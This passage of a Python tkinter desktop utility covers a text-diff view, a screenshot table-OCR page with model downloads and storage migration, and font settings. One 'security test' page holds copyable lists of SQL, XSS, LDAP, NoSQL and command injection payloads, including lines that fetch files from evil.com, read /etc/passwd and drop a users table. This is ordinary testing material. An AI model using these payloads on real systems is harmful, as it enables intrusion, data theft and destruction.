        self._jd_right.insert("1.0", s2)
        # 清除旧标注后应用新标注
        for w, spans in ((self._jd_left, left_spans), (self._jd_right, right_spans)):
            w.tag_remove("changed_bg", "1.0", "end")
            w.tag_remove("changed_fg", "1.0", "end")
            for (a, b, kind) in spans:
                tag = "changed_bg" if kind == "line" else "changed_fg"
                w.tag_add(tag, f"{a[0]}.{a[1]}", f"{b[0]}.{b[1]}")
        # 更新行号显示
        self._jd_update_line_numbers(self._jd_left, self._jd_left_line_numbers)
        self._jd_update_line_numbers(self._jd_right, self._jd_right_line_numbers)
        # 在日志中显示差异行号信息
        left_lines = sorted(set(a[0][0] for a, b, kind in left_spans if kind == "line"))
        right_lines = sorted(set(a[0][0] for a, b, kind in right_spans if kind == "line"))
        if left_lines:
            self._log(f"左侧差异行: {', '.join(map(str, left_lines))}\n")
        if right_lines:
            self._log(f"右侧差异行: {', '.join(map(str, right_lines))}\n")
        self._log_result_banner(True)

    def _jd_clear(self):
        for w in (self._jd_left, self._jd_right):
            w.delete("1.0", "end")
            w.tag_remove("changed_bg", "1.0", "end")
            w.tag_remove("changed_fg", "1.0", "end")
        # 清空行号
        for w in (self._jd_left_line_numbers, self._jd_right_line_numbers):
            w.config(state="normal")
            w.delete("1.0", "end")
            w.config(state="disabled")

    # =============== 页面12: 截图识别表格 ===============
    def _show_page_ocr_table(self):
        self.title_label.config(text="截图识别表格")

        self._label(self.content, "点击截图或按快捷键，拖动鼠标框选表格区域，识别后自动显示结果。").pack(anchor="w", pady=(0, 8))

        # 快捷键设置区域
        hotkey_frame = tk.Frame(self.content, bg="#f5f6fa")
        hotkey_frame.pack(fill="x", pady=(0, 8))

        self._label(hotkey_frame, "全局快捷键:").pack(side="left")
        self._ocr_hotkey_entry = tk.Entry(hotkey_frame, textvariable=self._ocr_hotkey_var, width=20)
        self._ocr_hotkey_entry.pack(side="left", padx=8)
        tk.Button(hotkey_frame, text="设置快捷键", command=self._ocr_set_hotkey, width=12).pack(side="left", padx=4)
        self._label(hotkey_frame, "（设置后立即生效，如 Ctrl+Shift+T）").pack(side="left")

        # 识别模型选择区域（切换立即生效；非内置模型首次使用需联网下载一次）
        model_frame = tk.Frame(self.content, bg="#f5f6fa")
        model_frame.pack(fill="x", pady=(0, 2))
        self._label(model_frame, "识别模型:").pack(side="left")
        self._ocr_model_var = tk.StringVar(value=_OCR_MODEL_CHOICE)
        self._ocr_model_combo = ttk.Combobox(
            model_frame, textvariable=self._ocr_model_var, state="readonly",
            values=list(_OCR_MODEL_OPTIONS.keys()), width=28)
        self._ocr_model_combo.pack(side="left", padx=8)
        self._ocr_model_combo.bind(
            "<<ComboboxSelected>>", lambda e: self._ocr_set_model())
        # 模型说明（随选择更新：优点/缺点/适用场景）
        self._ocr_model_desc = tk.Label(
            self.content, text=_OCR_MODEL_OPTIONS[_OCR_MODEL_CHOICE]["desc"],
            bg="#f5f6fa", fg="#7f8c8d", font=("Microsoft YaHei UI", 9),
            wraplength=760, justify="left")
        self._ocr_model_desc.pack(anchor="w", pady=(0, 8))

        # 文件存储位置（模型/日志等大文件的存放目录，可更改以避免占用 C 盘）
        storage_frame = tk.Frame(self.content, bg="#f5f6fa")
        storage_frame.pack(fill="x", pady=(0, 2))
        self._label(storage_frame, "文件存储位置:").pack(side="left")
        self._storage_path_label = tk.Label(
            storage_frame, text=_STORAGE_DIR, bg="#f5f6fa", fg="#2c3e50",
            font=("Microsoft YaHei UI", 9), anchor="w")
        self._storage_path_label.pack(side="left", padx=8, fill="x", expand=True)
        self._storage_btn = tk.Button(
            storage_frame, text="更改位置...", width=12,
            command=self._change_storage_dir)
        self._storage_btn.pack(side="left", padx=4)
        self._storage_hint_label = tk.Label(
            self.content, text="（模型、日志、配置等文件将保存到该位置，默认为程序所在目录；更改后自动迁移已有文件并立即生效）",
            bg="#f5f6fa", fg="#7f8c8d", font=("Microsoft YaHei UI", 9))
        self._storage_hint_label.pack(anchor="w", pady=(0, 8))

        # 操作按钮区域
        btn_frame = tk.Frame(self.content, bg="#f5f6fa")
        btn_frame.pack(fill="x", pady=(0, 8))

        tk.Button(btn_frame, text="截图", command=self._ocr_capture,
                  bg="#3498db", fg="white",
                  font=("Microsoft YaHei UI", 11, "bold"), width=12).pack(side="left", padx=4)
        tk.Button(btn_frame, text="选择图片文件", command=self._ocr_select_file, width=14).pack(side="left", padx=4)

        # 识别结果表格区域
        result_label = tk.Label(self.content, text="识别结果:", bg="#f5f6fa",
                                 font=("Microsoft YaHei UI", 10, "bold"))
        result_label.pack(anchor="w", pady=(0, 4))

        # 表格容器（带滚动条）
        table_container = tk.Frame(self.content, bg="#f5f6fa")
        table_container.pack(fill="both", expand=True)

        self._ocr_tree_scroll_y = tk.Scrollbar(table_container, orient="vertical")
        self._ocr_tree_scroll_y.pack(side="right", fill="y")

        self._ocr_tree_scroll_x = tk.Scrollbar(table_container, orient="horizontal")
        self._ocr_tree_scroll_x.pack(side="bottom", fill="x")

        self._ocr_tree = ttk.Treeview(
            table_container,
            yscrollcommand=self._ocr_tree_scroll_y.set,
            xscrollcommand=self._ocr_tree_scroll_x.set
        )
        self._ocr_tree.pack(fill="both", expand=True)
        self._ocr_tree.bind("<MouseWheel>", lambda e: self._ocr_tree.yview_scroll(int(-1 * (e.delta / 120)), "units"))

        self._ocr_tree_scroll_y.config(command=self._ocr_tree.yview)
        self._ocr_tree_scroll_x.config(command=self._ocr_tree.xview)

        # 底部操作按钮
        bottom_frame = tk.Frame(self.content, bg="#f5f6fa")
        bottom_frame.pack(fill="x", pady=(8, 0))

        tk.Button(bottom_frame, text="复制全部到剪贴板", command=self._ocr_copy,
                  bg="#e67e22", fg="white",
                  font=("Microsoft YaHei UI", 10, "bold"), width=18).pack(side="left", padx=4)
        tk.Button(bottom_frame, text="导出Excel文件", command=self._ocr_export_excel, width=14).pack(side="left", padx=4)
        tk.Button(bottom_frame, text="清空", command=self._ocr_clear, width=10).pack(side="left", padx=4)

    def _ocr_set_hotkey(self):
        """设置快捷键（校验后立即生效，无需重启；结果只在日志中提示，不弹窗）"""
        hotkey = self._ocr_hotkey_var.get().strip()
        if not hotkey:
            self._notify("请输入快捷键组合（如 Ctrl+Shift+T）")
            return
        parsed, err = _parse_hotkey(hotkey)
        if parsed is None:
            self._notify(f"快捷键设置失败: {err}（输入: {hotkey}）")
            return
        combo, display = parsed
        # 保存规范化文本到存储位置（失败不影响内存中的立即生效）
        try:
            _write_config(".ocr_hotkey", display)
        except Exception as e:
            self._notify(f"保存快捷键失败: {e}")
            return
        # 重建监听器，立即生效
        if self._restart_ocr_hotkey_listener():
            self._notify(f"快捷键已设置为: {display}（立即生效）")
        else:
            self._notify(f"快捷键 {display} 监听器启动失败，请查看日志排查")

    def _ocr_set_model(self):
        """切换识别模型：已就绪则立即生效；未下载则确认后后台下载，完成后生效"""
        global _OCR_MODEL_CHOICE
        label = self._ocr_model_var.get()
        opt = _OCR_MODEL_OPTIONS[label]
        # 说明文字随选择即时更新（即使取消下载也保留展示）
        self._ocr_model_desc.config(text=opt["desc"])
        if label == _OCR_MODEL_CHOICE:
            return
        missing = [opt[k] for k in ("det", "rec") if _ocr_model_dir(opt[k]) is None]
        if not missing:
            _OCR_MODEL_CHOICE = label
            _save_ocr_model_choice(label)
            self._notify(f"识别模型已切换: {label}（立即生效），正在后台加载...")
            threading.Thread(target=_prewarm_pipeline_worker, daemon=True).start()
            return
        # 已有同模型下载在进行中：不重复下载（并发写同一目录会导致文件损坏）
        if self._ocr_downloading == label:
            self._notify(f"模型 {label} 正在下载中，请等待完成")
            return
        if self._storage_migrating:
            # 迁移期间下载会写到旧目录，迁移完成时的清理会误删新下载文件
            self._notify("存储位置正在迁移中，请等待完成后再下载模型")
            self._ocr_model_var.set(_OCR_MODEL_CHOICE)
            self._ocr_model_desc.config(
                text=_OCR_MODEL_OPTIONS[_OCR_MODEL_CHOICE]["desc"])
            return
        if self._ocr_downloading is not None:
            self._notify(f"正在下载 {self._ocr_downloading}，请等待完成后再切换其他模型")
            self._ocr_model_var.set(_OCR_MODEL_CHOICE)
            self._ocr_model_desc.config(
                text=_OCR_MODEL_OPTIONS[_OCR_MODEL_CHOICE]["desc"])
            return
        if not messagebox.askyesno(
                "下载模型",
                f"模型 {label} 尚未下载（约 {opt['size_mb']} MB）。\n"
                "是否现在联网下载？\n（仅下载一次，保存到本机，之后离线可用；"
                "下载期间识别仍使用当前模型）"):
            # 取消：下拉框还原为当前生效模型
            self._ocr_model_var.set(_OCR_MODEL_CHOICE)
            self._ocr_model_desc.config(
                text=_OCR_MODEL_OPTIONS[_OCR_MODEL_CHOICE]["desc"])
            return
        self._ocr_downloading = label
        threading.Thread(target=self._download_model_worker,
                         args=(label, missing), daemon=True).start()

    def _download_model_worker(self, label, missing):
        """后台线程：下载所选模型到外部目录，全部成功后切换生效并预热"""
        global _OCR_MODEL_CHOICE
        opt = _OCR_MODEL_OPTIONS[label]
        # 下载开始时的选择快照：下载期间用户可能已切换到其他模型，
        # 完成后若直接覆盖会推翻用户的 newer 选择
        orig_choice = _OCR_MODEL_CHOICE

        def notify(text):
            # _notify 直接操作 Tk 控件，非主线程必须经 after 调度
            try:
                self.after(0, lambda t=text: self._notify(t))
            except Exception:
                pass

        def reset_downloading():
            try:
                self.after(0, lambda: setattr(self, "_ocr_downloading", None))
            except Exception:
                pass

        notify(f"开始下载模型 {label}（约 {opt['size_mb']} MB），"
               "下载完成后自动切换，期间识别仍使用原模型...")
        for name in missing:
            try:
                _download_model(name, _external_models_dir())
                notify(f"模型 {name} 下载完成")
            except Exception as e:
                logging.error(f"[模型下载] {name} 失败: {e}\n{traceback.format_exc()}")
                # 删除半成品目录：残缺目录会被误认为已就绪（_ocr_model_dir 校验
                # inference.yml 也是为此），下次选择将重新走下载流程
                import shutil
                shutil.rmtree(
                    os.path.join(_external_models_dir(), "official_models", name),
                    ignore_errors=True)
                notify(f"模型 {name} 下载失败: {e}（可稍后在\"识别模型\"中重试）")
                reset_downloading()
                return
        if _OCR_MODEL_CHOICE != orig_choice:
            notify(f"模型 {label} 已下载完成（下载期间已切换为其他模型，"
                   "可稍后在\"识别模型\"中选择使用）")
            reset_downloading()
            return
        _OCR_MODEL_CHOICE = label
        _save_ocr_model_choice(label)
        notify(f"识别模型已切换: {label}（立即生效），正在后台加载...")
        reset_downloading()
        threading.Thread(target=_prewarm_pipeline_worker, daemon=True).start()

    def _change_storage_dir(self):
        """更改文件存储位置：选目录后后台迁移已有文件，完成后立即生效"""
        global _STORAGE_DIR
        if self._storage_migrating:
            self._notify("存储位置正在迁移中，请等待完成")
            return
        if self._ocr_downloading is not None:
            self._notify("正在下载模型，请等待下载完成后再更改存储位置")
            return
        if self._running:
            # 迁移会移动模型文件，识别任务可能正读取它们
            self._notify("有任务正在运行，请等待完成后再更改存储位置")
            return
        new_dir = filedialog.askdirectory(
            title="选择文件存储位置（模型、日志等将保存到该目录）",
            initialdir=_STORAGE_DIR)
        if not new_dir:
            return
        new_dir = os.path.abspath(new_dir)
        if os.path.normcase(new_dir) == os.path.normcase(_STORAGE_DIR):
            self._notify(f"存储位置未变化: {new_dir}")
            return
        # 新位置不能位于现有模型目录内部（把自己迁进自己）
        if os.path.normcase(_STORAGE_DIR) in os.path.normcase(new_dir):
            self._notify("新位置不能位于当前存储目录内部")
            return
        self._storage_migrating = True
        self._storage_btn.config(state="disabled")
        self._notify(f"开始迁移文件到新存储位置: {new_dir}（后台进行，不影响其他操作）...")
        threading.Thread(target=self._migrate_storage_worker,
                         args=(new_dir,), daemon=True).start()

    def _migrate_storage_worker(self, new_dir):
        """后台线程：把现有模型/日志等文件迁移到新存储位置，完成后切换生效"""
        global _STORAGE_DIR
        old_dir = _STORAGE_DIR

        def notify(text):
            try:
                self.after(0, lambda t=text: self._notify(t))
            except Exception:
                pass

        def finish(ok):
            def _done():
                self._storage_migrating = False
                self._storage_btn.config(state="normal")
                if ok:
                    self._storage_path_label.config(text=_STORAGE_DIR)
            try:
                self.after(0, _done)
            except Exception:
                pass

        try:
            import shutil
            os.makedirs(new_dir, exist_ok=True)
            # 1) 迁移模型目录（大头，可能数百 MB）：先复制后删除，
            #    中途失败时旧目录仍完整，不会丢数据
            old_models = os.path.join(old_dir, "models")
            if os.path.isdir(old_models):
                new_models = os.path.join(new_dir, "models")
                notify("正在复制模型文件到新位置（文件较大时需要一些时间）...")
                shutil.copytree(old_models, new_models, dirs_exist_ok=True)
                shutil.rmtree(old_models, ignore_errors=True)
            # 2) 迁移日志与配置文件（日志正被句柄持有，复制而非移动；
            #    本进程继续写旧文件，下次启动写新位置。配置文件移动）
            for fname in ("update.log", "crash.log"):
                src = os.path.join(old_dir, fname)
                if os.path.isfile(src):
                    try:
                        shutil.copy2(src, os.path.join(new_dir, fname))
                    except Exception:
                        pass
            for fname in (".ocr_hotkey", ".ocr_model"):
                src = os.path.join(old_dir, fname)
                if os.path.isfile(src):
                    try:
                        shutil.move(src, os.path.join(new_dir, fname))
                    except Exception:
                        pass
            # 3) 全部成功后才写入配置并切换（保证崩溃时旧配置仍有效）
            with open(_STORAGE_CONFIG_FILE, "w", encoding="utf-8") as f:
                f.write(new_dir)
            _STORAGE_DIR = new_dir
            notify(f"存储位置已切换: {new_dir}（已迁移完成并立即生效）")
            finish(True)
        except Exception as e:
            logging.error(f"[存储迁移] 失败: {e}\n{traceback.format_exc()}")
            notify(f"存储位置迁移失败: {e}（已保留原位置，可稍后重试）")
            finish(False)

    def _load_ocr_hotkey(self):
        """加载保存的快捷键（配置存放在存储位置）"""
        hotkey = _read_config(".ocr_hotkey")
        return hotkey if hotkey else "Ctrl+Shift+T"

    def _init_ocr_hotkey(self):
        """初始化全局快捷键监听（已保存的快捷键非法时回退默认并提示）"""
        hotkey = self._load_ocr_hotkey()
        parsed, err = _parse_hotkey(hotkey)
        if parsed is None:
            self._log(f"[提示] 已保存的快捷键 {hotkey!r} 无效（{err}），"
                      "回退默认 Ctrl+Shift+T\n")
            hotkey = "Ctrl+Shift+T"
        self._ocr_hotkey_var.set(hotkey)
        self._restart_ocr_hotkey_listener()

    def _restart_ocr_hotkey_listener(self):
        """（重新）创建全局快捷键监听器，返回是否成功"""
        try:
            from pynput import keyboard
        except ImportError:
            self._log("提示: 安装 pynput 可启用全局快捷键 (pip install pynput)\n")
            return False

        # 先停掉旧监听器（如有）
        old = getattr(self, "_ocr_listener", None)
        if old is not None:
            try:
                old.stop()
            except Exception:
                pass
            self._ocr_listener = None

        try:
            hotkey_str = self._ocr_hotkey_var.get().strip()
            parsed, err = _parse_hotkey(hotkey_str)
            if parsed is None:
                self._log(f"[提示] 快捷键 {hotkey_str!r} 无效: {err}，监听器未启动\n")
                return False
            combo, display = parsed

            def on_activate():
                self.after(0, self._ocr_capture)

            self._ocr_listener = keyboard.GlobalHotKeys({combo: on_activate})
            self._ocr_listener.daemon = True
            self._ocr_listener.start()
            self._log_global(f"[快捷键] 全局监听已启动: {display}\n")
            return True
        except Exception as e:
            self._log(f"[快捷键] 监听器启动失败: {e}\n")
            return False

    def _ocr_capture(self):
        """截图功能"""
        # 识别任务运行中：新截图的结果无处安放，直接提示
        if self._running:
            self._notify("识别任务正在进行中，请等待完成后再截图")
            return
        # 选择器已打开（连按两次快捷键）：忽略重复触发，避免叠出两个全屏选择器
        if self._ocr_selecting:
            return
        self._ocr_selecting = True
        # 隐藏主窗口
        self.withdraw()
        self.update()
        import time
        time.sleep(0.2)

        def on_region_selected(image):
            self._ocr_selecting = False
            # 恢复主窗口
            self.deiconify()
            self.update()

            if image is None:
                return

            # 注意：提示语必须在 _start_task 之后写——_start_task 会清空日志面板，
            # 先写会被清掉（曾导致识别期间面板空白）
            self._start_task(self._ocr_do_recognize, image,
                             on_done=self._ocr_on_recognize_done)
            self._log("截图完成，正在识别表格...\n")

        capture_region(parent=self, callback=on_region_selected)

    def _ocr_select_file(self):
        _load_heavy_modules()
        """选择图片文件"""
        f = filedialog.askopenfilename(
            title="选择图片文件",
            filetypes=[("图片文件", "*.jpg *.jpeg *.png *.bmp *.tiff *.tif *.gif")]
        )
        if f:
            try:
                image = Image.open(f)
                # 提示语在 _start_task 之后写，避免被其清空日志面板
                self._start_task(self._ocr_do_recognize, image,
                                 on_done=self._ocr_on_recognize_done)
                self._log(f"已加载图片: {os.path.basename(f)}，正在识别表格...\n")
            except Exception as e:
                messagebox.showerror("错误", f"打开图片失败: {e}")

    def _ocr_do_recognize(self, image):
        """执行表格识别（在后台线程中运行）"""
        import time
        # 看门狗：每 5 秒向日志面板报进度，让用户知道识别正在进行
        stop = threading.Event()

        def _progress():
            t0 = time.time()
            while not stop.wait(5):
                print(f"[识别] 进行中... 已用时 {time.time() - t0:.0f} 秒")

        threading.Thread(target=_progress, daemon=True).start()
        try:
            print("[识别] 开始识别表格...")
            table_data, html = recognize_table(image)
            return table_data
        finally:
            stop.set()

    def _ocr_on_recognize_done(self, result):
        """识别完成回调"""
        if result is None:
            self._log("识别失败或未识别到表格\n")
            return

        self._ocr_table_data = result

        if not result:
            self._log("未识别到表格内容\n")
            return

        # 更新Treeview
        self._ocr_update_tree(result)
        self._log(f"识别完成，共 {len(result)} 行\n")

    def _ocr_update_tree(self, table_data):
        """更新Treeview表格显示"""
        # 清空旧数据
        self._ocr_tree.delete(*self._ocr_tree.get_children())

        if not table_data:
            return

        # 设置列（使用第一行作为列标题）
        headers = table_data[0] if table_data else []
        col_count = len(headers) if headers else 0

        if col_count == 0:
            return

        # 配置列
        self._ocr_tree["columns"] = [f"col{i}" for i in range(col_count)]
        self._ocr_tree["show"] = "headings"

        for i, header in enumerate(headers):
            col_id = f"col{i}"
            self._ocr_tree.heading(col_id, text=header, anchor="w")
            self._ocr_tree.column(col_id, width=120, minwidth=80, anchor="w")

        # 插入数据行（跳过第一行表头）
        for row in table_data[1:]:
            # 确保每行列数一致
            values = row + [""] * (col_count - len(row))
            values = values[:col_count]
            self._ocr_tree.insert("", "end", values=values)

    def _ocr_copy(self):
        """复制表格到剪贴板"""
        if not self._ocr_table_data:
            self._notify("没有可复制的数据")
            return

        data = self._ocr_table_data
        headers = data[0]
        rows = data[1:]

        text_col_indices = set()
        for row in rows:
            for i, cell in enumerate(row):
                s = str(cell)
                if len(s) >= 15 and s.isdigit():
                    text_col_indices.add(i)

        lines = ['\t'.join(str(h) for h in headers)]
        for row in rows:
            vals = []
            for i, cell in enumerate(row):
                v = str(cell)
                if i in text_col_indices:
                    v = "'" + v
                vals.append(v)
            lines.append('\t'.join(vals))
        tsv = '\n'.join(lines)

        self.clipboard_clear()
        self.clipboard_append(tsv)
        self._notify("已复制到剪贴板（TSV格式）")

    def _ocr_export_excel(self):
        """导出为Excel文件"""
        if not self._ocr_table_data:
            self._notify("没有可导出的数据")
            return

        try:
            import openpyxl
        except ImportError:
            # 如果没有openpyxl，生成CSV文件
            return self._ocr_export_csv()

        f = filedialog.asksaveasfilename(
            title="导出Excel文件",
            defaultextension=".xlsx",
            filetypes=[("Excel文件", "*.xlsx"), ("所有文件", "*.*")]
        )
        if not f:
            return

        try:
            wb = openpyxl.Workbook()
            ws = wb.active
            ws.title = "识别结果"

            for row in self._ocr_table_data:
                ws.append(row)

            wb.save(f)
            self._log(f"已导出Excel: {f}\n")
        except Exception as e:
            messagebox.showerror("错误", f"导出失败: {e}")

    def _ocr_export_csv(self):
        """导出为CSV文件（备选方案）"""
        f = filedialog.asksaveasfilename(
            title="导出CSV文件",
            defaultextension=".csv",
            filetypes=[("CSV文件", "*.csv"), ("所有文件", "*.*")]
        )
        if not f:
            return

        try:
            import csv
            with open(f, "w", newline="", encoding="utf-8-sig") as csvfile:
                writer = csv.writer(csvfile)
                for row in self._ocr_table_data:
                    writer.writerow(row)
            self._log(f"已导出CSV: {f}\n")
        except Exception as e:
            messagebox.showerror("错误", f"导出失败: {e}")

    def _ocr_clear(self):
        """清空数据"""
        self._ocr_table_data = []
        self._ocr_tree.delete(*self._ocr_tree.get_children())
        self._ocr_tree["columns"] = []

    # =============== 页面14: 安全测试 ===============
    def _show_page_security(self):
        self.title_label.config(text="数据注入")
        self._label(self.content, "选择注入类型，生成可测试的注入代码，支持复制和导出为文件。").pack(anchor="w", pady=(0, 8))

        row1 = self._row(self.content)
        self._label(row1, "注入类型:").pack(side="left")
        self._security_type_var = tk.StringVar(value="SQL注入")
        types = ["sql", "xss", "cmd", "ldap", "nosql"]
        type_names = {"sql": "SQL注入", "xss": "XSS脚本注入", "cmd": "命令注入", "ldap": "LDAP注入", "nosql": "NoSQL注入"}
        ttk.Combobox(row1, textvariable=self._security_type_var,
                     values=[type_names[t] for t in types], state="readonly", width=16).pack(side="left", padx=(4, 10))
        self._security_types = types

        tk.Button(row1, text="生成代码", command=self._generate_injection,
                  bg="#e67e22", fg="white",
                  font=("Microsoft YaHei UI", 10, "bold"), width=12).pack(side="left", padx=(0, 10))

        # 代码展示区
        code_frame = tk.Frame(self.content, bg="#f5f6fa")
        code_frame.pack(fill="both", expand=True, pady=(4, 4))
        self._security_code_text = tk.Text(code_frame, font=("Consolas", 10),
                                             state="disabled", wrap="word", bg="#1e1e1e", fg="#d4d4d4")
        self._security_code_text.pack(side="left", fill="both", expand=True)
        scrollbar = ttk.Scrollbar(code_frame, orient="vertical", command=self._security_code_text.yview)
        scrollbar.pack(side="right", fill="y")
        self._security_code_text["yscrollcommand"] = scrollbar.set

        # 操作按钮区
        btn_row = self._row(self.content)
        tk.Button(btn_row, text="复制", command=self._copy_injection, width=10).pack(side="left", padx=(0, 10))
        tk.Button(btn_row, text="导出", command=self._export_injection, width=10).pack(side="left")

        # 初始化空提示
        self._security_code_text.config(state="normal")
        self._security_code_text.insert("1.0", "点击上方「生成代码」按钮生成注入测试代码。")
        self._security_code_text.config(state="disabled")
        self._security_current_type = "sql"
        self._security_code_lines = []

    def _generate_injection(self):
        """根据选中类型生成注入代码"""
        try:
            type_label = self._security_type_var.get()
            type_map = {"SQL注入": "sql", "XSS脚本注入": "xss", "命令注入": "cmd",
                         "LDAP注入": "ldap", "NoSQL注入": "nosql"}
            self._security_current_type = type_map.get(type_label, "sql")

            payloads = {
                "sql": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "' UNION SELECT NULL,NULL,NULL--",
                    "'; DROP TABLE users--",
                    "admin' OR '1'='1'--",
                    "' OR EXISTS(SELECT * FROM information_schema.tables)--",
                    "' UNION SELECT username,password FROM users--",
                    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND SLEEP(5)--",
                    "' OR 'a'='a",
                    "\" OR \"1\"=\"1",
                    "' OR 1=1#",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
                ],
                "xss": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "<body onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                    "<a href=javascript:alert(1)>click</a>",
                    "<div onmouseover=alert(1)>hover</div>",
                    "<input onfocus=alert(1) autofocus>",
                    "<details ontoggle=alert(1) open>",
                    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
                    "<svg><script>alert(1)</script></svg>",
                    "\"><script>alert(1)</script>",
                    "'><script>alert(1)</script>",
                    "<img src=1 onerror=alert(1)>",
                    "<marquee onstart=alert(1)>",
                ],
                "cmd": [
                    "; dir",
                    "&& whoami",
                    "| cat /etc/passwd",
                    "$(whoami)",
                    "`whoami`",
                    "| ls -la",
                    "; ipconfig",
                    "&& type C:\\windows\\system32\\drivers\\etc\\hosts",
                    "| powershell Get-Process",
                    "; ping 127.0.0.1 -n 5",
                    "|| dir",
                    "| curl http://evil.com/shell",
                    "& mshta http://evil.com/shell.hta",
                    "| certutil -urlcache -f http://evil.com/malware.exe",
                    "; wget http://evil.com/shell.sh",
                ],
                "ldap": [
                    "*",
                    "(objectClass=*)",
                    "*)(uid=*",
                    "(&(objectClass=user)(cn=*))",
                    "(cn=*)(|(uid=*)(sn=*))",
                    "(&(uid=*)(objectClass=person))",
                    "(|(cn=admin)(uid=admin))",
                    "(&(mail=*)(|(!(cn=*))(|(sn=*))))",
                    "(&(objectClass=*)(memberOf=cn=admin,ou=groups,dc=example,dc=com))",
                    "(|(uid=admin)(userPassword=*))",
                ],
                "nosql": [
                    '{"$gt": ""}',
                    '{"$ne": null}',
                    '{"$gt": "", "$lt": ""}',
                    '{"$where": "return true"}',
                    '{"$gt": "", "$exists": true}',
                    '{"$regex": ".*"}',
                    '{"$where": "this.password == \\"admin\\"}',
                    '[{"$gt": ""}]',
                    '{"username": {"$eq": "admin"}, "password": {"$ne": null}}',
                    '{"$or": [{"username": "admin"}, {"password": {"$exists": true}}]}',
                ],
            }

            selected = payloads.get(self._security_current_type, payloads["sql"])
            lines = []
            for i, p in enumerate(selected, 1):
                lines.append(f"{i}. {p}")

            self._security_code_lines = selected
            self._security_code_text.config(state="normal")
            self._security_code_text.delete("1.0", "end")
            self._security_code_text.insert("1.0", "\n".join(lines))
            self._security_code_text.config(state="disabled")
            self._log(f"[安全测试] 已生成 {self._security_current_type.upper()} 注入代码，共 {len(selected)} 条")
        except Exception as e:
            self._notify(f"生成注入代码失败: {e}")

    def _copy_injection(self):
        """复制当前代码到剪贴板"""
        try:
            if not self._security_code_lines:
                self._notify("没有可复制的代码，请先生成")
                return
            text = "\n".join(self._security_code_lines)
            self.clipboard_clear()
            self.clipboard_append(text)
            self._notify("注入代码已复制到剪贴板")
        except Exception as e:
            self._notify(f"复制失败: {e}")

    def _export_injection(self):
        """导出注入代码到文件"""
        if not self._security_code_lines:
            self._notify("没有可导出的代码，请先生成")
            return

        ext_map = {
            "sql": (".sql", "SQL文件", "*.sql"),
            "xss": (".html", "HTML文件", "*.html"),
            "cmd": (".txt", "文本文件", "*.txt"),
            "ldap": (".txt", "文本文件", "*.txt"),
            "nosql": (".txt", "文本文件", "*.txt"),
        }
        default_ext, file_desc, pattern = ext_map.get(self._security_current_type, (".txt", "文本文件", "*.txt"))

        try:
            f = filedialog.asksaveasfilename(
                title=f"导出{file_desc}",
                defaultextension=default_ext,
                filetypes=[(file_desc, pattern), ("所有文件", "*.*")],
                initialdir=_APP_DIR,
                initialfile=f"injection_{self._security_current_type}")
            if not f:
                return
            with open(f, "w", encoding="utf-8") as fp:
                fp.write("\n".join(self._security_code_lines))
            self._notify(f"注入代码已导出到: {f}")
            self._log(f"[安全测试] 已导出 {self._security_current_type.upper()} 代码到: {f}")
        except Exception as e:
            self._notify(f"导出失败: {e}")

    # =============== 全局字体缩放 ===============
    def _apply_font_scale(self):
        """遍历所有控件，按 self._font_scale 重新设置字体大小（首次记录原始值）"""
        import tkinter.font as tkfont
        scale = self._font_scale

        # ttk 控件（Treeview 等）不走 cget("font")，需通过 Style 统一缩放
        try:
            if not hasattr(self, "_ttk_base_font"):
                _sf = tkfont.nametofont("TkDefaultFont")
                self._ttk_base_font = (_sf.actual("family"), _sf.actual("size"))
            fam, sz = self._ttk_base_font
            _st = ttk.Style()
            _st.configure("Treeview", font=(fam, max(7, round(10 * scale))))
            _st.configure("Treeview.Heading", font=(fam, max(7, round(10 * scale)), "bold"))
        except Exception:
            pass

        def walk(w):
            for child in w.winfo_children():
                walk(child)
            try:
                f = w.cget("font")
            except Exception:
                return
            if not f:
                return
            key = str(w)
            base = self._font_base.get(key)
            if base is None:
                try:
                    fo = tkfont.Font(font=f)
                    base = (fo.actual("family"), fo.actual("size"),
                            fo.actual("weight"), fo.actual("slant"))
                except Exception:
                    return
                self._font_base[key] = base
            fam, size, weight, slant = base
            try:
                w.configure(font=(fam, max(7, round(size * scale)), weight, slant))
            except Exception:
                pass

        walk(self)

    def _on_font_scale_changed(self, value):
        """设置页滑块回调：实时应用字体缩放"""
        try:
            self._font_scale = float(value)
            _write_config("ui_font_scale", str(self._font_scale))
            self._apply_font_scale()
            lbl = getattr(self, "_font_scale_value_label", None)
            if lbl is not None and lbl.winfo_exists():
                lbl.config(text=f"{int(round(float(value) * 100))}%")
        except Exception:
            pass

    # =============== 页面14: 设置 ===============
    def _show_page_settings(self):
        self.title_label.config(text="设置")
        card = tk.Frame(self.content, bg="white")
        card.pack(fill="x", padx=4, pady=8)

        tk.Label(card, text="字体大小", bg="white", fg="#2c3e50",
                 font=("Microsoft YaHei UI", 12, "bold")).pack(anchor="w", padx=16, pady=(12, 4))
        tk.Label(card, text="拖动滑块实时调整整个界面的字体大小（100% 为默认大小）",
                 bg="white", fg="#7f8c8d",
                 font=("Microsoft YaHei UI", 9)).pack(anchor="w", padx=16)

        row = tk.Frame(card, bg="white")
        row.pack(fill="x", padx=16, pady=(4, 14))

        tk.Label(row, text="小", bg="white", fg="#2c3e50",
                 font=("Microsoft YaHei UI", 9)).pack(side="left")

        scale = tk.Scale(row, from_=0.8, to=1.6, resolution=0.05, orient="horizontal",
                         command=self._on_font_scale_changed, bg="white",
                         highlightthickness=0, length=280, showvalue=False)
        scale.set(self._font_scale)
        scale.pack(side="left", padx=8, fill="x", expand=True)

        tk.Label(row, text="大", bg="white", fg="#2c3e50",
                 font=("Microsoft YaHei UI", 13)).pack(side="left")

        self._font_scale_value_label = tk.Label(card, text=f"{int(round(self._font_scale * 100))}%",
                                                bg="white", fg="#1abc9c",
                                                font=("Microsoft YaHei UI", 12, "bold"))
        self._font_scale_value_label.pack(anchor="e", padx=16, pady=(0, 12))

    # =============== 页面13: 关于 ===============
    def _show_page_about(self):
        self.title_label.config(text="关于")
        info = (
            f"{APP_NAME} v{APP_VERSION}\n\n"
            "功能列表:\n"
            "  1. 图片转 PDF - 将多张图片合并为一个PDF\n"
